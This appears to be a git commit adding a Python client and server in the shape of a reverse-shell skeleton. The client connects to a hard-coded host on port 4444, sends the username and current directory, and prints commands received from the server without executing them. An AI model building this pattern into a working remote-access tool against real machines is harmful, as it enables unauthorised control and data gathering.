d33a384a95b855f5804b9b140856c47f6be33abf
Владимир Матвеев <110328797+VladimirMatveev98@users.noreply.github.com>
2022-09-07 13:31:09 +0300

    Add files via upload

---
+++ client.py
@@ -0,0 +1,30 @@
+import socket
+import getpass
+import os
+import time
+
+s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+host = '192.168.1.45'
+port = 4444
+s.connect((host, port))
+
+current_user = getpass.getuser()
+current_user = str(current_user)
+s.send(current_user.encode())
+
+time.sleep(0.1) #Необходимо для корректной передачи информации на сервер
+
+current_user = os.path.abspath(os.curdir)
+current_user = str(current_user)
+s.send(current_user.encode())
+
+time.sleep(0.1)
+
+while True:
+    command = s.recv(1024)
+    command = command.decode()
+
+    print('->> ', command)
+
+    if command == 'exit':
+        break
---
+++ server.py
@@ -0,0 +1,27 @@
+import socket
+
+s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+host = '192.168.1.45'
+port = 4444
+s.bind((host, port))
+s.listen(1)
+print('wait for connection...')
+conn, addr = s.accept()
+print('connected with ', addr)
+
+current_user = conn.recv(1024)
+current_user = current_user.decode()
+current_user = str(current_user)
+print('User: ', current_user)
+
+current_dir = conn.recv(1024)
+current_dir = current_dir.decode()
+current_dir = str(current_dir)
+print('Start from: ', current_dir)
+
+while True:
+    command = input(str('#>> '))
+    conn.send(command.encode())
+
+    if command == 'exit':
+        break
